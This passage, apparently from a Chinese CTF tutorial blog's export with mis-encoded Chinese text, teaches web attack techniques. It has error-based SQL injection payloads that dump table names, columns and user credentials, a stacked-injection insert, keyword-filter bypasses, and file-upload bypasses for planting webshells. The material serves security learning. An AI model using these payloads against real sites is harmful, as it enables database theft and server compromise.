class="number">0x5c</span>,<span class="built_in">floor</span>(<span class="built_in">rand</span>(<span class="number">0</span>)*<span class="number">2</span>)))#      çˆ†æ•°æ®åº“ç‰ˆæœ¬</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="number">1</span>&#x27; <span class="built_in">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(*) <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema=database() <span class="built_in">group</span> <span class="keyword">by</span> concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema=database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">0x7e</span>,<span class="built_in">floor</span>(<span class="built_in">rand</span>(<span class="number">0</span>)*<span class="number">2</span>)))#    é€šè¿‡ä¿®æ”¹limitåé¢æ•°å­—ä¸€ä¸ªä¸€ä¸ªçˆ†è¡¨</span><br><span class="line"><span class="number">1</span>&#x27; <span class="built_in">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(*) <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema=database() <span class="built_in">group</span> <span class="keyword">by</span> concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema=database()),<span class="number">0x7e</span>,<span class="built_in">floor</span>(<span class="built_in">rand</span>(<span class="number">0</span>)*<span class="number">2</span>)))#        çˆ†å‡ºæ‰€æœ‰è¡¨</span><br><span class="line"> </span><br><span class="line">  </span><br><span class="line"><span class="number">1</span>&#x27; <span class="built_in">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(*) <span class="keyword">from</span> information_schema.columns <span class="built_in">where</span> table_schema=database() <span class="built_in">group</span> <span class="keyword">by</span> concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="built_in">where</span> table_schema=database() <span class="built_in">and</span> table_name=&#x27;users&#x27;),<span class="number">0x7e</span>,<span class="built_in">floor</span>(<span class="built_in">rand</span>(<span class="number">0</span>)*<span class="number">2</span>)))#    çˆ†å‡ºæ‰€æœ‰å­—æ®µå</span><br><span class="line"><span class="number">1</span>&#x27; <span class="built_in">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(*) <span class="keyword">from</span> information_schema.columns <span class="built_in">group</span> <span class="keyword">by</span> concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(username,password) <span class="keyword">from</span> users),<span class="number">0x7e</span>,<span class="built_in">floor</span>(<span class="built_in">rand</span>(<span class="number">0</span>)*<span class="number">2</span>)))#    çˆ†å‡ºæ‰€æœ‰å­—æ®µå</span><br><span class="line"> </span><br><span class="line"><span class="number">1</span>&#x27; <span class="built_in">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">count</span>(*) <span class="keyword">from</span> information_schema.columns <span class="built_in">where</span> table_schema=database() <span class="built_in">group</span> <span class="keyword">by</span> concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> password <span class="keyword">from</span> users <span class="built_in">where</span> username=&#x27;admin1&#x27;),<span class="number">0x7e</span>,<span class="built_in">floor</span>(<span class="built_in">rand</span>(<span class="number">0</span>)*<span class="number">2</span>)))a)#    çˆ†å‡ºè¯¥è´¦æˆ·çš„å¯†ç ã€‚</span><br></pre></td></tr></table></figure>

<h2 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h2><p> &emsp;&emsp;è‡³æ­¤å¤§å¤šæ•°çš„sqlæ³¨å…¥æ–¹æ³•ï¼Œè¿˜æœ‰ä¸€ä¸ªå †å æ³¨å…¥ï¼Œåƒæ˜¯è¿™æ ·çš„ç”¨æ³•<code>login_user=1&amp;login_password=1&#39;;insert into users(id,username,password) values (&#39;39&#39;,&#39;less30&#39;,&#39;123456&#39;)--+&amp;mysubmit=Login</code>ï¼Œè¿™ä¸ªç®€å•å»äº†è§£ä¸€ä¸‹å³å¯ã€‚ä¸‹é¢æ˜¯ä¸€äº›ç‰¹æ®Šæƒ…å†µçš„ç»•è¿‡ã€‚</p>
<h3 id="æ›¿æ¢ç»•è¿‡"><a href="#æ›¿æ¢ç»•è¿‡" class="headerlink" title="æ›¿æ¢ç»•è¿‡"></a>æ›¿æ¢ç»•è¿‡</h3><p> &emsp;&emsp;å¾ˆå¸¸ç”¨çš„æ–¹æ³•ï¼ŒåŒå†™ç©¿æ’ã€‚<br> <figure class="highlight xl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">or</span>     --&gt;</span> oorr</span><br><span class="line"><span class="function"><span class="title">and</span>    --&gt;</span> aandnd</span><br><span class="line"><span class="function"><span class="title">union</span>  --&gt;</span> uunionnion</span><br><span class="line"><span class="function"><span class="title">select</span> --&gt;</span> seselectlect</span><br><span class="line">... ...</span><br></pre></td></tr></table></figure></p>
<h3 id="å¤§å°å†™ç»•è¿‡"><a href="#å¤§å°å†™ç»•è¿‡" class="headerlink" title="å¤§å°å†™ç»•è¿‡"></a>å¤§å°å†™ç»•è¿‡</h3><p> &emsp;&emsp;åœ¨å®æˆ˜ä¸­ï¼Œè¿™ç§æ–¹æ³•å¹¶ä¸å¸¸è§äº†<br> <figure class="highlight xl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">or</span>     --&gt;</span> Or</span><br><span class="line"><span class="function"><span class="title">select</span> --&gt;</span> SEleCt</span><br><span class="line"><span class="function"><span class="title">union</span>  --&gt;</span> UniOn</span><br><span class="line"><span class="function"><span class="title">and</span>    --&gt;</span> aND</span><br></pre></td></tr></table></figure></p>
<h3 id="ç©ºæ ¼ç»•è¿‡"><a href="#ç©ºæ ¼ç»•è¿‡" class="headerlink" title="ç©ºæ ¼ç»•è¿‡"></a>ç©ºæ ¼ç»•è¿‡</h3><p> &emsp;&emsp;å¾ˆå¸¸è§çš„ä¸€ç§ï¼Œä¹Ÿå¾ˆçƒ¦ï¼Œåœ¨æ¯ä¸€ä¸ªç©ºæ ¼å¤„æ›¿æ¢,æŠ¥é”™æ³¨å…¥ä½¿ç”¨ç©ºæ ¼æ¯”è¾ƒå°‘ï¼Œä¹Ÿå¯ä½¿ç”¨æ­¤æ–¹æ³•ã€‚<br> <figure class="highlight haml"><table><tr><td class="code"><pre><span class="line"><span class="tag">%<span class="selector-tag">09</span></span> TABé”®ï¼ˆæ°´å¹³ï¼‰</span><br><span class="line"><span class="tag">%<span class="selector-tag">0a</span></span> æ¢è¡Œ</span><br><span class="line"><span class="tag">%<span class="selector-tag">0c</span></span> æ¢é¡µ</span><br><span class="line"><span class="tag">%<span class="selector-tag">0d</span></span> returnåŠŸèƒ½</span><br><span class="line"><span class="tag">%<span class="selector-tag">0b</span></span> TABé”®ï¼ˆå‚ç›´ï¼‰</span><br><span class="line"><span class="tag">%<span class="selector-tag">20</span></span>,%a0,+ ç©ºæ ¼</span><br><span class="line"><span class="comment">/**/ æ³¨é‡Š</span></span><br></pre></td></tr></table></figure></p>
<h3 id="é€»è¾‘è¿ç®—ç¬¦ç»•è¿‡"><a href="#é€»è¾‘è¿ç®—ç¬¦ç»•è¿‡" class="headerlink" title="é€»è¾‘è¿ç®—ç¬¦ç»•è¿‡"></a>é€»è¾‘è¿ç®—ç¬¦ç»•è¿‡</h3><figure class="highlight xl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">and</span> --&gt;</span> &amp;&amp;</span><br><span class="line"><span class="function"><span class="title">or</span>  --&gt;</span> ||</span><br></pre></td></tr></table></figure>

<h3 id="å®½å­—èŠ‚ç»•è¿‡"><a href="#å®½å­—èŠ‚ç»•è¿‡" class="headerlink" title="å®½å­—èŠ‚ç»•è¿‡"></a>å®½å­—èŠ‚ç»•è¿‡</h3><p> &emsp;&emsp;å½“æ–œæ ï¼Œå•å¼•å·å’ŒåŒå¼•å·è¿‡æ»¤æˆ–è€…è½¬ä¹‰çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨å®½å­—èŠ‚ç»•è¿‡ã€‚å½“æŸå­—ç¬¦çš„å¤§å°ä¸ºä¸€ä¸ªå­—èŠ‚æ—¶ï¼Œç§°å…¶å­—ç¬¦ä¸ºçª„å­—èŠ‚å½“æŸå­—ç¬¦çš„å¤§å°ä¸ºä¸¤ä¸ªå­—èŠ‚æ—¶ï¼Œç§°å…¶å­—ç¬¦ä¸ºå®½å­—èŠ‚ã€‚æ‰€æœ‰è‹±æ–‡é»˜è®¤å ä¸€ä¸ªå­—èŠ‚ï¼Œæ±‰å­—å ä¸¤ä¸ªå­—èŠ‚ã€‚ä¹Ÿå°±æ˜¯å…¨è§’å’ŒåŠè§’ã€‚</p>
<h3 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h3><p>&emsp;&emsp;å¾ˆå¸¸è§çš„ç»•è¿‡æ‰‹æ®µäº†ï¼Œåå…­è¿›åˆ¶ç¼–ç å°±è¡Œã€‚</p>
<h4 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h4><p>&emsp;&emsp;è‡³æ­¤ï¼Œæ‰‹åŠ¨sqlæ³¨å…¥å·²ç»æˆåŠŸå‡ºå¸ˆï¼Œå…³äºsqlæ³¨å…¥ï¼Œè¿˜å¯ä»¥ä½¿ç”¨sqlmapå·¥å…·ã€‚è½¬è‡³<a href="/2024/8/3/sqlmap/">sqlmap</a>å»å­¦ä¹ ä¸€ä¸‹å§ã€‚</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>æ³¨å…¥</tag>
        <tag>sqlæ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¿¡æ¯æ”¶é›†ï¼ˆCTFåŸºç¡€ç¯‡ï¼‰</title>
    <url>/2024/07/18/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88CTF%E5%9F%BA%E7%A1%80%E7%AF%87%EF%BC%89/</url>
    <content><![CDATA[<p>&emsp;&emsp;ä¿¡æ¯æ”¶é›†ä½œä¸ºCTFæœ€å¸¸ç”¨çš„æ‰‹æ®µï¼ˆç›´æ¥ç»™æºç çš„ä¸ç®—ï¼‰ï¼Œå¸¸è§„æ€è·¯æœ‰<br><font color=black><br>ctrl+U æŸ¥çœ‹æºä»£ç <br>F12  æŸ¥çœ‹jsè„šæœ¬<br>robots.txt æ–‡ä»¶æ³„éœ²,åœ¨URLåé¢åŠ ä¸Š&#x2F;robots.txt,å¯èƒ½ä¼šç»™å‡ºflagæˆ–æ‰€åœ¨è·¯å¾„<br><a href="http://www.zip/">www.zip</a>   å‹ç¼©åŒ…ï¼ŒåŒä¸Šç”¨æ³•<br>dirsearch   æ‰«ææ–‡ä»¶ï¼Œè½¬è‡³<a href="/2024/07/23/dirsearch/">dirsearch</a><br>BurpSuite  æŠ“åŒ…æ‰¾å“åº”å¤´ï¼Œè½¬è‡³<a href="/2024/07/25/BurpSuite/">BurpSuite</a><br></font><br>&emsp;&emsp;åŸºæœ¬æ€è·¯å°±è¿™äº›ï¼Œå‰©ä¸‹çš„å°±é ä½ çš„æœç´¢èƒ½åŠ›äº†( à©­ Ë™á—œË™ )à©­</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>åŸºç¡€</tag>
      </tags>
  </entry>
  <entry>
    <title>æ–‡ä»¶ä¸Šä¼ </title>
    <url>/2024/07/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<p>&emsp;&emsp;æ–‡ä»¶ä¸Šä¼ æ˜¯åˆ©ç”¨æœåŠ¡ç«¯æ‰€æä¾›ç»™ä½ çš„æƒåŠ›ï¼Œæœ¬æ„æ˜¯è®©ä½ ä»¬ä¸Šä¼ ä¸€äº›æœ‰æ„ä¹‰çš„ä¸œè¥¿ï¼Œä½†ä¸€äº›äººå°±ä»ä¸­å‘ç°äº†ä¸€äº›å¯ä»¥åˆ©ç”¨çš„æ¼æ´ï¼Œä¸Šä¼ ä¸€å¥è¯æœ¨é©¬è¿›å»ï¼Œè¿™å°±æ˜¯å…¸å‹çš„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œé æˆ‘ä»¬å»çŒœè¿‡æ»¤ï¼Œä»è€Œç»•è¿‡å®ƒã€‚é‚£ä¹ˆæœ‰ä»¥ä¸‹å‡ ç§æ–¹å¼çš„è¿‡æ»¤å’Œç»•è¿‡æ–¹æ³•ã€‚</p>
<h3 id="å‰ç«¯æ£€æµ‹"><a href="#å‰ç«¯æ£€æµ‹" class="headerlink" title="å‰ç«¯æ£€æµ‹"></a>å‰ç«¯æ£€æµ‹</h3><p>&emsp;&emsp;å¯¹äºå‰ç«¯çš„æ¦‚å¿µå°±æ˜¯æˆ‘ä»¬èƒ½çœ‹åˆ°çš„æºç çš„é‚£ç§ï¼Œæˆ‘ä»¬å¯ä»¥æ‰“å¼€F12æˆ–è€…ctrl+Uæ‰¾jsä»£ç ï¼ŒåŸç†å°±æ˜¯å‰ç«¯æ˜¯å®¢æˆ·ç«¯è¿˜æ²¡æœ‰å‘æœåŠ¡å™¨å‘é€ä»»ä½•æ¶ˆæ¯æ—¶å¯¹<font color=red>æœ¬åœ°</font>è¿›è¡Œæ£€æµ‹æ¥åˆ¤æ–­æ˜¯å¦æ»¡è¶³ä¸Šä¼ çš„ç±»å‹ã€‚<br>&emsp;&emsp;ç»•è¿‡æ–¹æ³•</p>
<ul>
<li>åˆ é™¤æˆ–è€…ç¦ç”¨js(JavaScript) å„ä¸ªæµè§ˆå™¨æœ‰ä¸åŒçš„æ–¹å¼</li>
<li>ä½¿ç”¨ä»£ç†ä¸Šä¼ æ–‡ä»¶ï¼Œç”¨BPæŠ“åŒ…ä¿®æ”¹æˆç¬¦åˆè¦æ±‚çš„æ–‡ä»¶ç±»å‹ï¼Œä½¿ç”¨æ–¹æ³•è½¬è‡³<a href="/2024/07/25/BurpSuite/">BurpSuite</a></li>
</ul>
<h3 id="åç«¯æ£€æµ‹"><a href="#åç«¯æ£€æµ‹" class="headerlink" title="åç«¯æ£€æµ‹"></a>åç«¯æ£€æµ‹</h3><p>&emsp;&emsp;è¿™ç§çš„å°±ä¸èƒ½é æŠ“åŒ…æå‰å»æ”¹äº†ï¼Œä¸»è¦æ˜¯é€šè¿‡é»‘ç™½åå•è¿›è¡Œè¿‡æ»¤æ£€æµ‹ã€‚</p>
<h4 id="ç™½åå•ç»•è¿‡"><a href="#ç™½åå•ç»•è¿‡" class="headerlink" title="ç™½åå•ç»•è¿‡"></a>ç™½åå•ç»•è¿‡</h4><h5 id="è§£ææ¼æ´ï¼ˆé»‘åå•é€šç”¨ï¼‰"><a href="#è§£ææ¼æ´ï¼ˆé»‘åå•é€šç”¨ï¼‰" class="headerlink" title="è§£ææ¼æ´ï¼ˆé»‘åå•é€šç”¨ï¼‰"></a>è§£ææ¼æ´ï¼ˆé»‘åå•é€šç”¨ï¼‰</h5><figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">.htaccessæ–‡ä»¶è§£ææ¼æ´   <span class="comment">//é‡ç‚¹å¸¸è€ƒç‚¹ï¼ˆæœ‰æ²¡æœ‰è€å¸ˆåˆ’é‡ç‚¹çš„é‚£å‘³äº†- Í€Ì—(à¹‘áµ”âŒ”áµ”à¹‘)ï¼‰</span></span><br><span class="line">apacheè§£ææ¼æ´</span><br><span class="line">IIS7.<span class="number">0</span> <span class="string">| IIS7.5 | Nginxçš„è§£ææ¼æ´</span></span><br><span class="line">IIS6.<span class="number">0</span>è§£ææ¼æ´</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;å…³äºè¿™äº›è§£ææ¼æ´æˆ‘å°±ä¸ç»†è®²äº†ï¼Œå¯¹ç…§ç›¸åº”çš„æœç´¢ä¸€ä¸‹å°±å¯ä»¥äº†ï¼Œè¿™äº›æ¼æ´åç»­ä¹Ÿä¼šåœ¨å¯¹åº”æ¿å—å‡ºç°ã€‚</p>
<h5 id="æˆªæ–­ä¸Šä¼ ï¼ˆé»‘åå•é€šç”¨ï¼‰"><a href="#æˆªæ–­ä¸Šä¼ ï¼ˆé»‘åå•é€šç”¨ï¼‰" class="headerlink" title="æˆªæ–­ä¸Šä¼ ï¼ˆé»‘åå•é€šç”¨ï¼‰"></a>æˆªæ–­ä¸Šä¼ ï¼ˆé»‘åå•é€šç”¨ï¼‰</h5><ul>
<li>æˆªæ–­ç±»å‹:PHP%00æˆªæ–­ (æ‰©å±•æƒ³æƒ³è¿˜æœ‰å“ªä¸ªå‡½æ•°ä¹Ÿæ˜¯è¿™æ ·çš„)ï¼Œä¾‹å¦‚1.php%00</li>
<li>æˆªæ–­åŸç†:ç”±äº00ä»£è¡¨ç»“æŸç¬¦,æ‰€ä»¥ä¼šæŠŠ00åé¢çš„æ‰€æœ‰å­—ç¬¦éƒ½æˆªæ–­,åŒç†ï¼Œé»‘åå•ä¹Ÿå¯ä»¥ç”¨ï¼Œä¸è¿‡æˆ‘ç”¨å¾—å°‘</li>
<li>æˆªæ–­æ¡ä»¶:PHPç‰ˆæœ¬å°äº5.3.4,PHPçš„magic_quotes_gpcä¸ºOFFçŠ¶æ€</li>
</ul>
<h4 id="æ”¹åç¼€"><a href="#æ”¹åç¼€" class="headerlink" title="æ”¹åç¼€"></a>æ”¹åç¼€</h4><p>&emsp;&emsp;å°†phpæœ¨é©¬æ”¹æˆæ»¡è¶³æ¡ä»¶çš„åç¼€å³å¯ï¼Œä¾‹å¦‚<font color=red>1.php &#x3D;&gt; 1.jpg</font></p>
<h4 id="é»‘åå•ç»•è¿‡"><a href="#é»‘åå•ç»•è¿‡" class="headerlink" title="é»‘åå•ç»•è¿‡"></a>é»‘åå•ç»•è¿‡</h4><h5 id="ç‰¹æ®Šçš„æ‰©å±•å"><a href="#ç‰¹æ®Šçš„æ‰©å±•å" class="headerlink" title="ç‰¹æ®Šçš„æ‰©å±•å"></a>ç‰¹æ®Šçš„æ‰©å±•å</h5><p>&emsp;&emsp;å¦‚æœæ˜¯é»‘åå•çš„å°±å¯ä»¥é’»ç©ºå­ï¼Œçœ‹æœ‰æ²¡æœ‰æ¼ç½‘ä¹‹é±¼ï¼Œä¾‹å¦‚</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">æ¯”å¦‚:</span></span><br><span class="line">asaå’Œcerä¹‹ç±»</span><br><span class="line"><span class="section">asp: asa cer aspx</span></span><br><span class="line"><span class="section">jsp: jspx jspf</span></span><br><span class="line"><span class="section">php: php php3 php4 php5 phtml pht (åˆ’é‡ç‚¹)</span></span><br><span class="line"><span class="section">exe: exee</span></span><br></pre></td></tr></table></figure>

<h5 id="åˆ©ç”¨windowsçš„å‘½åæœºåˆ¶"><a href="#åˆ©ç”¨windowsçš„å‘½åæœºåˆ¶" class="headerlink" title="åˆ©ç”¨windowsçš„å‘½åæœºåˆ¶"></a>åˆ©ç”¨windowsçš„å‘½åæœºåˆ¶</h5><p>&emsp;&emsp;åœ¨windowsä¸­ï¼Œåç¼€ååé¢çš„ç‚¹å’Œç©ºæ ¼éƒ½ä¼šè¢«åˆ é™¤æ‰ã€‚ä¾‹å¦‚</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="built_in">shell</span>.php.â€ƒâ€ƒ <span class="built_in">shell</span>.phpç©ºæ ¼ â€ƒâ€ƒ<span class="built_in">shell</span>.php:<span class="number">1.</span>jpgâ€ƒâ€ƒ <span class="built_in">shell</span>. php::$DATAâ€ƒâ€ƒ <span class="built_in">shell</span>.php:<span class="number">1.</span>jpg</span><br></pre></td></tr></table></figure>

<h5 id="åŒå†™ç»•è¿‡"><a href="#åŒå†™ç»•è¿‡" class="headerlink" title="åŒå†™ç»•è¿‡"></a>åŒå†™ç»•è¿‡</h5><p>&emsp;&emsp;æœ‰æ—¶å€™åœ¨æ£€æµ‹æ—¶ï¼Œåå°ä¼šæŠŠæ•æ„Ÿå­—ç¬¦æ›¿æ¢æˆç©ºæ ¼ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨åŒå†™è¿›è¡Œç»•è¿‡ã€‚SQLæ³¨å…¥åŒç†ï¼Œï¼Œä¾‹å¦‚:phphpp</p>
<h5 id="å¤§å°å†™ç»•è¿‡"><a href="#å¤§å°å†™ç»•è¿‡" class="headerlink" title="å¤§å°å†™ç»•è¿‡"></a>å¤§å°å†™ç»•è¿‡</h5><p>&emsp;&emsp;åç¼€åæœ¬è´¨ä¸Šæ˜¯ä¸åŒºåˆ†å¤§å°å†™æ»´ï¼Œä¾‹å¦‚pHpï¼Œä½†åç«¯æ£€æµ‹çš„æ—¶å€™å°±è¯´ä¸å‡†äº†ï¼ŒåŒç†å‘¢ï¼ŒSQLè¯­å¥è¿‡æ»¤ä¹Ÿæ˜¯è¿™æ ·çš„é“ç†ã€‚è¦ä¸¾ä¸€åä¸‰å™¢ï½¸ï¾ï½¯!(à¹‘â€¢Ì€ã…‚â€¢Ì)Ùˆâœ§</p>
<h4 id="MIMEæ£€æµ‹"><a href="#MIMEæ£€æµ‹" class="headerlink" title="MIMEæ£€æµ‹"></a>MIMEæ£€æµ‹</h4><p>&emsp;&emsp;MIME(Multipurpose Internet Mail Extensions)å¤šç”¨é€”äº’è”ç½‘é‚®ä»¶æ‰©å±•ç±»å‹ã€‚æ˜¯è®¾å®šæŸç§æ‰©å±•åçš„æ–‡ä»¶ç”¨ä¸€ç§åº”ç”¨ç¨‹åºæ¥æ‰“å¼€çš„æ–¹å¼ç±»å‹ï¼Œå½“è¯¥æ‰©å±•åæ–‡ä»¶è¢«è®¿é—®çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨ä½¿ç”¨æŒ‡å®šåº”ç”¨ç¨‹åºæ¥æ‰“å¼€ã€‚ç”¨ä½ çš„BPæ‰“å¼€ï¼Œç±»ä¼¼äºè¿™äº›:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">text/plain ï¼ˆçº¯æ–‡æœ¬ï¼‰</span><br><span class="line">text/html ï¼ˆHTMLæ–‡æ¡£ï¼‰</span><br><span class="line">text/javascript ï¼ˆjsä»£ç ï¼‰</span><br><span class="line">application/xhtml+xml ï¼ˆXHTMLæ–‡æ¡£ï¼‰</span><br><span class="line">image/gif ï¼ˆGIFå›¾åƒï¼‰</span><br><span class="line">image/jpeg ï¼ˆJPEGå›¾åƒï¼‰</span><br><span class="line">image/png ï¼ˆPNGå›¾åƒï¼‰</span><br><span class="line">video/mpeg ï¼ˆMPEGåŠ¨ç”»ï¼‰</span><br><span class="line">application/octet-stream ï¼ˆäºŒè¿›åˆ¶æ•°æ®ï¼‰</span><br><span class="line">application/pdf ï¼ˆPDFæ–‡æ¡£ï¼‰</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;æ£€æµ‹æ–¹å¼ï¼šåœ¨æ–‡ä»¶ä¸Šä¼ è¿‡ç¨‹ä¸­ï¼ŒæœåŠ¡ç«¯ä¼šé’ˆå¯¹æˆ‘ä»¬çš„ä¸Šä¼ çš„æ–‡ä»¶ç”Ÿæˆä¸€ä¸ªæ•°ç»„ï¼Œè¿™ä¸ªæ•°ç»„å…¶ä¸­æœ‰ä¸€é¡¹å°±æ˜¯è¿™ä¸ªæ–‡ä»¶çš„ç±»å‹file_typeï¼›æœåŠ¡ç«¯å¯¹æ–‡ä»¶è¿›è¡Œæ£€æµ‹æ—¶ï¼Œå°±æ˜¯é€šè¿‡æ£€æµ‹è„šæœ¬ä¸­çš„é»‘ç™½åå•å’Œè¿™ä¸ªæ•°ç»„ä¸­çš„file_typeè¿›è¡Œå¯¹æ¯”ï¼Œå¦‚æœç¬¦åˆè¦æ±‚å°±å…è®¸ä¸Šä¼ è¿™ä¸ªæ–‡ä»¶ã€‚ç»•è¿‡æ–¹æ³•æˆ‘ä»¬å°±åªè¦å°†<font color=red>content-type</font>å­—æ®µæ”¹ä¸ºå¸¸è§çš„å…è®¸æ”¾è¡Œçš„å›¾ç‰‡ç±»å‹,ä¾‹å¦‚<font color=blue>image&#x2F;gif</font>,ä»è€Œç»•è¿‡æ ¡éªŒã€‚</p>
<h4 id="æ–‡ä»¶å¤´ç»•è¿‡"><a href="#æ–‡ä»¶å¤´ç»•è¿‡" class="headerlink" title="æ–‡ä»¶å¤´ç»•è¿‡"></a>æ–‡ä»¶å¤´ç»•è¿‡</h4><p>&emsp;&emsp;æˆ‘ä»¬å¯ä»¥æŠŠä¸Šé¢çš„æ–‡ä»¶å¤´æ·»åŠ åˆ°æˆ‘ä»¬çš„ä¸€å¥è¯æœ¨é©¬å†…å®¹æœ€å‰é¢ï¼Œè¾¾åˆ°ç»•è¿‡æ–‡ä»¶å¤´æ£€æµ‹çš„ç›®çš„ã€‚æ¯”å¦‚<br><img data-src="/images/GIF%E6%9C%A8%E9%A9%AC.png" alt="GIFæœ¨é©¬"></p>
<h4 id="å†…å®¹æ£€æµ‹å›¾ç‰‡é©¬ç»•è¿‡"><a href="#å†…å®¹æ£€æµ‹å›¾ç‰‡é©¬ç»•è¿‡" class="headerlink" title="å†…å®¹æ£€æµ‹å›¾ç‰‡é©¬ç»•è¿‡"></a>å†…å®¹æ£€æµ‹å›¾ç‰‡é©¬ç»•è¿‡</h4><p>&emsp;&emsp;å°†ä¸€å¥è¯æœ¨é©¬æ’å…¥åˆ°ä¸€ä¸ªåˆæ³•çš„å›¾ç‰‡æ–‡ä»¶å½“ä¸­ï¼Œç„¶åç”¨webshellç®¡ç†å·¥å…·(èšå‰‘)è¿æ¥ï¼Œå½“ç„¶è¿™è¾¹å»ºè®®ä½ å…ˆç”¨phpinfoè¯•ä¸€ä¸‹ï¼Œä¸€æ–¹é¢æœ‰çš„æ—¶å€™flagå°±åœ¨é‡Œé¢ï¼Œå¦ä¸€æ–¹é¢èƒ½éªŒè¯æ˜¯å¦ä¸Šä¼ æˆåŠŸã€‚ç›¸å…³æ–‡ç« :<a href="https://blog.csdn.net/weixin_45588247/article/details/119141986">å›¾ç‰‡é©¬</a></p>
<h3 id="æ¡ä»¶ç«äº‰æ¼æ´"><a href="#æ¡ä»¶ç«äº‰æ¼æ´" class="headerlink" title="æ¡ä»¶ç«äº‰æ¼æ´"></a>æ¡ä»¶ç«äº‰æ¼æ´</h3><p>&emsp;&emsp;è¿™ä¸ªå°±å¾ˆé«˜æ·±äº†ï¼Œéœ€è¦ç†Ÿç»ƒä½¿ç”¨BPï¼Œå…¥é—¨å»ºè®®å…ˆåˆ«çœ‹ã€‚ç›¸å…³æ–‡ç« :<a href="https://blog.csdn.net/weixin_45588247/article/details/118796606?spm=1001.2014.3001.5501">æ¡ä»¶ç«äº‰</a></p>
<h3 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h3><p>&emsp;&emsp;æ–‡ä»¶ä¸Šä¼ ç›®å‰å¸¸ç”¨çš„å°±å‡ ç§ï¼Œä¸»è¦æˆ‘ä¹Ÿåªä¼šè¿™å‡ ç§ï¼Œé‡ç‚¹åœ¨äºå¤šåšåšé¢˜ç›®ï¼Œæ¨èé¢˜åº“ï¼š<a href="https://www.nssctf.cn/problem">NSSCTF</a>ï¼Œ<a href="https://buuoj.cn/">BUUCTF</a>ï¼Œ<a href="https://ctf.bugku.com/">BugkuCTF</a>,å…‰ä¸Šé¢å‡ ä¸ªå°±å¤Ÿä½ è¯•çš„äº†ï¼Œä¸è¯¦ç»†çš„åœ°æ–¹å†å»æœç´¢ä¸€ä¸‹ï¼Œè¦æ˜¯åç»­é‡åˆ°æ–°çš„æ–¹æ³•æˆ‘ä¹Ÿä¼šå®æ—¶æ›´æ–°çš„ã€‚</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>æ–‡ä»¶ä¸Šä¼ </tag>
      </tags>
  </entry>
  <entry>
    <title>å‘½ä»¤æ‰§è¡Œ</title>
    <url>/2024/07/16/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<p>&emsp;&emsp;å‘½ä»¤æ‰§è¡Œå¯ä»¥è¯´æ˜¯è´¯å½»æ•´ä¸ªæ¯”èµ›çš„è¦ç‚¹ï¼Œä¸ç„¶ä½ å‘ç°æ¼æ´äº†éƒ½ä¸çŸ¥é“æ€ä¹ˆæå–flagï¼Œåˆ«å‘Šè¯‰æˆ‘ä½ åªä¼šF12ï¼Œctrl+Uæ‰¾(à¹‘â€¾á·…^â€¾á·…à¹‘)</p>
